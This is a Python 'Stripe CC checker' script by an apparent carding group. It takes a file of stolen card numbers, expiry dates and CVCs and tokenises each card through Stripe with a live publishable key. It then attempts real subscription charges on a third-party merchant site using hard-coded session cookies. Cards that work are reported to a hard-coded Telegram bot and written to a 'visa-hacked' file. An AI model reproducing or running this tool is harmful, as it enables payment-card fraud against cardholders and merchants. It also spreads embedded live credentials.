# @N_7_H| SONIK TEAM

import requests,os
import pyfiglet,time
from time import sleep
import datetime,webbrowser



G = '\033[1;32m'
E = '\033[1;31m'
S = '\x1b[1;33m'
B = '\033[2;36m'

Z =  '\033[1;31m' 
F = '\033[2;32m' 
X = '\033[1;33m' 
C = '\033[2;35m'


def salam_logo():
	print(S+"""
V.1.0
   ⠀⠀⠀⠀⠀⠀⠀⠀Checker CC  Stripe⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀  ⠀⠀ 
 SONIK TEAM 💎
  
    Script BY: @N_7_H     
   
        Channel: @W_2_8   

====================================
	""")
salam_logo()


def hello():
	x = datetime.datetime.now()
	g = datetime.datetime(2025, 2, 20, 12, 00, 0)
	if(x) > (g) or (x) == (g):
		  print(E+'\n\n تم ايقاف الاداة. ')
		  print(' Telegram : @W_2_8  ')
		  print(g)
		  webbrowser.open("https://t.me/W_2_8")
		  os.system('xdg-open  https://t.me/W_2_8')
		 
	else:
		print(G+' الاداة شغال ')
		print(g)
		print(' \n \n ')
		webbrowser.open("https://t.me/W_2_8")
		os.system('xdg-open  https://t.me/W_2_8')
hello()
print(B+'='*40)
print(B+'='*40)
file=input('[+] Combo File Path ==> ')
tok=input(' Enter Token Bot :')
id=input(' Enter Your ID :')
print(' ')
print(B+'='*40)
print(S+'  Started checking...  ')
print(B+'='*40)
print(' ')
start_num = 0
dollar='3'

for P in open(file,'r').read().splitlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	time.sleep(10)
	try:
		data = requests.get('https://bins.antipublic.cc/bins/'+P[:6]).json()
	except:
		pass
	try:
		bank=(data['bank'])
	except:
		bank=('UNKNOWN')
	try:
		emj=(data['country_flag'])
	except:
		emj=('UNKNOWN')
	try:
		cn=(data['country_name'])
	except:
		cn=('UNKNOWN')
	try:
		dicr=(data['level'])
	except:
		dicr=('UNKNOWN')
	try:
		typ=(data['type'])
	except:
		typ=('UNKNOWN')
	try:
		url=(data['brand'])
		
	except:
		url=('UNKNOWN')
	
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	data = f'card[name]=Salam+Hunter&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&card[address_zip]=10080&guid=fb99a0aa-3499-45eb-aed7-da7538e93751f8f2ff&muid=9601d301-634a-43b8-88b1-71e4c6a74fbe517ae0&sid=ae3c6831-029c-4cb3-bd28-10c5ac50e2074a479b&payment_user_agent=stripe.js%2F94c1597b4d%3B+stripe-js-v3%2F94c1597b4d%3B+card-element&referrer=https%3A%2F%2Fwww.giftly.com&time_on_page=107951&key=pk_live_9uP0gwkXUAojRI18OwPRJujr'

	salam = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=salam.json()['id']
		time.sleep(5)
	except:
		print(E+f'[ {start_num} ]',P,' ➜ ',salam.json()['error']['message'])
		print(B+'='*40)
		continue
	
	#import requests
	cookies = {
    '_gcl_au': '1.1.316582781.1706383593',
    '_ga': 'GA1.1.399294089.1706383593',
    'optiMonkClientId': '870e3a3c-2664-61a0-f2b2-46a7789468ad',
    'ci_session': 'm53qg8aqj3eqsbfki7m1h3fekmu2jrs5',
    '_ga_4HXMJ7D3T6': 'GS1.1.1707436031.2.1.1707436036.0.0.0',
    '_ga_KQ5ZJRZGQR': 'GS1.1.1707436032.2.1.1707436037.0.0.0',
}

	headerss = {
    'authority': 'www.lagreeod.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.316582781.1706383593; _ga=GA1.1.399294089.1706383593; optiMonkClientId=870e3a3c-2664-61a0-f2b2-46a7789468ad; ci_session=m53qg8aqj3eqsbfki7m1h3fekmu2jrs5; _ga_4HXMJ7D3T6=GS1.1.1707436031.2.1.1707436036.0.0.0; _ga_KQ5ZJRZGQR=GS1.1.1707436032.2.1.1707436037.0.0.0',
    'origin': 'https://www.lagreeod.com',
    'pragma': 'no-cache',
    'referer': 'https://www.lagreeod.com/subscribe',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	dataa = {
    'stripe_customer': '',
    'subscription_type': 'Weekly Subscription',
    'firstname': 'Sonik',
    'lastname': 'king',
    'email': 'sonik@hi2.in',
    'password': 'sonik112233@S',
    'card[name]': 'SonikHunter',
    'card[number]': n,
    'card[exp_month]': mm,
    'card[exp_year]': yy,
    'card[cvc]': cvc,
    'coupon': '',
    's1': '11',
    'sum': '21',
}


	response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headerss, data=dataa)

	try:
		if '"success":true' in response.text or "Payment success" in response.text or "Payment Completed." in response.text or "Thank you for your support." in response.text or "Success" in response.text or "Thank you" in response.text or "succedd" in response.text:
			#print(G+f'[ {start_num} ]',P,' ➜ ',response.text)
			msg=f'''◆ CARD  ➜ {P}                                
◆ STATUS ➜ CHARGE  ✅                                 
◆ SUCCESSFULL CHARGED ✅️                               
◆ GATEWAY ➜ STRIPE {dollar}$                     
━━━━━━━━━━━━━━━━━                    
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                         
◆ COUNTRY ➜ {cn} - {emj}                             
◆ BANK ➜ {bank}                       
◆ BRAND ➜ {url}                        
━━━━━━━━━━━━━━━━━                         
◆ BY: @W_2_8                
◆ Ch: @N_7_H                  '''
			requests.post(f'https://api.telegram.org/bot7013947097:AAHQUwj4elCYimeizBaPj5uFbspLsI_tMMY/sendMessage?chat_id=5913296583&text={msg}')
			print(G+msg)
			print(B+'='*40)
			with open('visa-hacked-T5B55.txt', 'a') as x:
				x.write(msg+'\n================\n')
		elif "Your card has insufficient funds." in response.text:
			msg=f'''◆ CARD  ➜ {P}                                   
◆ STATUS ➜ APPROVED  ✅                               
◆ Insufficient Funds. ✅️                                     
◆ GATEWAY ➜ STRIPE {dollar}$                           
━━━━━━━━━━━━━━━━━                        
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                            
◆ COUNTRY ➜ {cn} - {emj}                            
◆ BANK ➜ {bank}                          
◆ Brand ➜ {url}                           
━━━━━━━━━━━━━━━━━                       
◆ BY: @W_2_8                
◆ Ch: @N_7_H                  '''
			requests.post(f'https://api.telegram.org/bot7013947097:AAHQUwj4elCYimeizBaPj5uFbspLsI_tMMY/sendMessage?chat_id=5913296583&text={msg}')
			print(F+msg)
			print(B+'='*40)
			with open('visa-hacked-T5B55.txt', 'a') as x:
				x.write(msg+'\n================\n')
		elif "Invalid amount." in response.text:
			msg=f'''◆ CARD  ➜ {P}                                 
◆ STATUS ➜ APPROVED  ✅                               
◆ Insufficient Funds. ✅️                                    
◆ GATEWAY ➜ STRIPE {dollar}$                           
━━━━━━━━━━━━━━━━━                         
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                         
◆ COUNTRY ➜ {cn} - {emj}                        
◆ BANK ➜ {bank}                             
◆ Brand ➜ {url}                             
━━━━━━━━━━━━━━━━━                        
◆ BY: @W_2_8                    
◆ Ch: @N_7_H                   '''
			requests.post(f'https://api.telegram.org/bot7013947097:AAHQUwj4elCYimeizBaPj5uFbspLsI_tMMY/sendMessage?chat_id=5913296583&text={msg}')
			print(F+msg)
			print(B+'='*40)
			with open('visa-hacked-T5B55.txt', 'a') as x:
				x.write(msg+'\n================\n')
		elif "Your card's security code is incorrect." in response.text:
			msg=f'''◆ CARD  ➜ {P}                                   
◆ STATUS ➜ APPROVED  ✅                                 
◆ Security code is incorrect. ⚠️                              
◆ GATEWAY ➜ STRIPE {dollar}$                      
━━━━━━━━━━━━━━━━━                    
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                    
◆ COUNTRY ➜ {cn} - {emj}                     
◆ BANK ➜ {bank}                            
◆ Brand ➜ {url}                       
━━━━━━━━━━━━━━━━━                   
◆ BY: @W_2_8              
◆ Ch: @N_7_H                  '''
			requests.post(f'https://api.telegram.org/bot7013947097:AAHQUwj4elCYimeizBaPj5uFbspLsI_tMMY/sendMessage?chat_id=5913296583&text={msg}')
			print(X+msg)
			print(B+'='*40)
			with open('visa-hacked-T5B55.txt', 'a') as x:
				x.write(msg+'\n================\n')
		elif '"requires_action":true,"' in response.text:
			msg=f'''◆ CARD  ➜ {P}                               
◆ STATUS ➜ CCN LIVE  ✅                                 
◆ 3DSCURE ⚠️                         
◆ GATEWAY ➜ STRIPE {dollar}$                         
━━━━━━━━━━━━━━━━━                       
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                    
◆ COUNTRY ➜ {cn} - {emj}                        
◆ BANK ➜ {bank}                     
◆ BRAND ➜ {url}                       
━━━━━━━━━━━━━━━━━                       
◆ BY: @W_2_8                     
◆ Ch: @N_7_H                  '''
			requests.post(f'https://api.telegram.org/bot7013947097:AAHQUwj4elCYimeizBaPj5uFbspLsI_tMMY/sendMessage?chat_id=5913296583&text={msg}')
			print(X+msg)
			print(B+'='*40)
			with open('visa-hacked-T5B55.txt', 'a') as x:
				x.write(msg+'\n================\n')
		elif 'stripe_3ds2_fingerprint' in response.text:
			msg=f'''◆ CARD  ➜ {P}                                 
◆ STATUS ➜ CCN LIVE  ✅                                    
◆ 3DSCURE ⚠️                            
◆ GATEWAY ➜ STRIPE {dollar}$                         
━━━━━━━━━━━━━━━━━                         
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                     
◆ COUNTRY ➜ {cn} - {emj}                     
◆ BANK ➜ {bank}                          
◆ BRAND ➜ {url}                         
━━━━━━━━━━━━━━━━━                      
◆ BY: @W_2_8                             
◆ Ch: @N_7_H                '''
			requests.post(f'https://api.telegram.org/bot7013947097:AAHQUwj4elCYimeizBaPj5uFbspLsI_tMMY/sendMessage?chat_id=5913296583&text={msg}')
			print(X+msg)
			print(B+'='*40)
			with open('visa-hacked-T5B55.txt', 'a') as x:
				x.write(msg+'\n================\n')
		elif "Fraudulent" in response.text or "fraudulent" in response.text:
			msg=f'''◆ CARD  ➜ {P}                                
◆ STATUS ➜ DECLINED ❌️                       
◆ Fraudulent ❌️                    
◆ GATEWAY ➜ STRIPE {dollar}$               
━━━━━━━━━━━━━━━━━              
◆ BIN ➜ {P[:6]} - {dicr} - {typ}              
◆ COUNTRY ➜ {cn} - {emj}             
◆ BANK ➜ {bank}                
◆ BRAND ➜ {url}             
━━━━━━━━━━━━━━━━━            
◆ BY: @N_7_H
◆ Ch: @W_2_8                '''
			print(Z+msg)
			print(B+'='*40)
		elif "Do not honor" in response.text or "Do Not Honor" in response.text:
			msg=f'''◆ CARD  ➜ {P}                                 
◆ STATUS ➜ DECLINED ❌️                    
◆ Do not honor ❌️                   
◆ GATEWAY ➜ STRIPE {dollar}$                    
━━━━━━━━━━━━━━━━━              
◆ BIN ➜ {P[:6]} - {dicr} - {typ}           
◆ COUNTRY ➜ {cn} - {emj}             
◆ BANK ➜ {bank}              
◆ Brand ➜ {url}                
━━━━━━━━━━━━━━━━━             
◆ BY: @N_7_H
◆ Ch: @W_2_8                '''
			print(Z+msg)
			print(B+'='*40)
		elif "Your card does not support this type of purchase." in response.text:
			msg=f'''◆ CARD  ➜ {P}                                  
◆ STATUS ➜ DECLINED  ❌️                          
◆ Card does not support purchase. ❌️                           
◆ GATEWAY ➜ STRIPE {dollar}$              
━━━━━━━━━━━━━━━━━              
◆ BIN ➜ {P[:6]} - {dicr} - {typ}              
◆ COUNTRY ➜ {cn} - {emj}              
◆ BANK ➜ {bank}                  
◆ Brand ➜ {url}                  
━━━━━━━━━━━━━━━━━                 
◆ BY: @N_7_H
◆ Ch: @W_2_8               '''
			print(Z+msg)
			print(B+'='*40)
		elif "Your card's security code is invalid." in response.text:
			msg=f'''◆ CARD  ➜ {P}                                    
◆ STATUS ➜ DECLINED  ❌️                        
◆ Your card's security code is invalid.. ❌️                   
◆ GATEWAY ➜ STRIPE {dollar}$              
━━━━━━━━━━━━━━━━━              
◆ BIN ➜ {P[:6]} - {dicr} - {typ}              
◆ COUNTRY ➜ {cn} - {emj}              
◆ BANK ➜ {bank}                  
◆ Brand ➜ {url}                  
━━━━━━━━━━━━━━━━━                 
◆ BY: @N_7_H
◆ Ch: @W_2_8              '''
			print(Z+msg)
			print(B+'='*40)
		elif "Your card has expired." in response.text or "expired_card" in response.text:
			msg=f'''◆ CARD  ➜ {P}                                 
◆ STATUS ➜ DECLINED ❌️                        
◆ Your card has expired. ❌️                             
◆ GATEWAY ➜ STRIPE {dollar}$               
━━━━━━━━━━━━━━━━━                   
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                 
◆ COUNTRY ➜ {cn} - {emj}               
◆ BANK ➜ {bank}               
◆ Brand ➜ {url}                
━━━━━━━━━━━━━━━━━               
◆ BY: @N_7_H
◆ Ch: @W_2_8           '''
			print(Z+msg)
			print(B+'='*40)
		elif "Your card number is incorrect." in response.text:
			msg=f'''◆ CARD  ➜ {P}                               
◆ STATUS ➜ DECLINED ❌️                          
◆ Your card number is incorrect. ❌️                            
◆ GATEWAY ➜ STRIPE {dollar}$                        
━━━━━━━━━━━━━━━━━                     
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                   
◆ COUNTRY ➜ {cn} - {emj}                 
◆ BANK ➜ {bank}                  
◆ Brand ➜ {url}                 
━━━━━━━━━━━━━━━━━                  
◆ BY: @N_7_H
◆ Ch: @W_2_8                '''
			print(Z+msg)
			print(B+'='*40)
		elif "Your card was declined." in response.text:
				msg=f'''◆ CARD  ➜ {P}                                
◆ STATUS ➜ DECLINED ❌️                               
◆ Your card was declined. ❌️                              
◆ GATEWAY ➜ STRIPE {dollar}$                         
━━━━━━━━━━━━━━━━━                    
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                    
◆ COUNTRY ➜ {cn} - {emj}                     
◆ BANK ➜ {bank}                          
◆ Brand ➜ {url}                           
━━━━━━━━━━━━━━━━━                     
◆ BY: @W_2_8
◆ Ch: @N_7_H                '''
				print(Z+msg)
				print(B+'='*40)
		elif "Stolen card" in response.text or "stolen_card" in response.text:
			msg=f'''◆ CARD  ➜ {P}                                 
◆ STATUS ➜ CCN LIVE  ✅                       
◆ Stolen Card ⚠️                        
◆ GATEWAY ➜ STRIPE {dollar}$                      
━━━━━━━━━━━━━━━━━                 
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                       
◆ COUNTRY ➜ {cn} - {emj}                      
◆ BANK ➜ {bank}                             
◆ Brand ➜ {url}                          
━━━━━━━━━━━━━━━━━                        
◆ BY: @W_2_8
◆ Ch: @N_7_H               '''
			requests.post(f'https://api.telegram.org/bot7013947097:AAHQUwj4elCYimeizBaPj5uFbspLsI_tMMY/sendMessage?chat_id=5913296583&text={msg}')
			print(X+msg)
			print(B+'='*40)
			with open('visa-hacked-@N_7_H.txt', 'a') as x:
				x.write(msg+'\n================\n')
		elif "lost_card" in response.text or "Lost card" in response.text:
			msg=f'''◆ CARD  ➜ {P}                                    
◆ STATUS ➜ CCN LIVE  ✅                                   
◆ Lost Card ⚠️                        
◆ GATEWAY ➜ STRIPE {dollar}$                       
━━━━━━━━━━━━━━━━━                           
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                          
◆ COUNTRY ➜ {cn} - {emj}                       
◆ BANK ➜ {bank}                             
◆ Brand ➜ {url}                                  
━━━━━━━━━━━━━━━━━                    
◆ BY: @W_2_8
◆ Ch: @N_7_H                '''
			print(X+msg)
			print(B+'='*40)
			requests.post(f'https://api.telegram.org/bot7013947097:AAHQUwj4elCYimeizBaPj5uFbspLsI_tMMY/sendMessage?chat_id=5913296583&text={msg}')
			with open('visa-hacked-N_7_H.txt', 'a') as x:
				x.write(msg+'\n================\n')
		elif "Invalid account." in response.text or "invalid_account" in response.text:
			msg=f'''◆ CARD  ➜ {P}                                    
◆ STATUS ➜ DECLINED ❌️                         
◆ Invalid account ❌️                                
◆ GATEWAY ➜ STRIPE {dollar}$                      
━━━━━━━━━━━━━━━━━                                   
◆ BIN ➜ {P[:6]} - {dicr} - {typ}                            
◆ COUNTRY ➜ {cn} - {emj}                    
◆ BANK ➜ {bank}                        
◆ Brand ➜ {url}                        
━━━━━━━━━━━━━━━━━                   
◆ BY: @W_2_8
◆ Ch: @N_7_H              '''
			print(Z+msg)
			print(B+'='*40)
		elif "Retry later" in response.text:
			msg=f'''◆ CARD  ➜ {P}                             
◆ STATUS ➜ Retry later  ❌️                   
◆ You Blocked wait 1 / 2 times ❌️                                  
◆ GATEWAY ➜ STRIPE {dollar}$              
━━━━━━━━━━━━━━━━━              
◆ BIN ➜ {P[:6]} - {dicr} - {typ}              
◆ COUNTRY ➜ {cn} - {emj}              
◆ BANK ➜ {bank}                  
◆ Brand ➜ {url}                  
━━━━━━━━━━━━━━━━━                 
◆ BY: @W_2_8
◆ Ch: @N_7_H               '''
			print(Z+msg)
			print(B+'='*40)
			time.sleep(25)


	
		else:
			msgg = response.json()['message']
			print(Z+f'[ {start_num} ]',P,' ➜ ',msgg)
			print(B+'='*40)
	except:
		msggg = response.json()['message']
		print(Z+f'[ {start_num} ]',P,' ➜ ERROR ❌️ ',msggg)
		print(B+'='*40)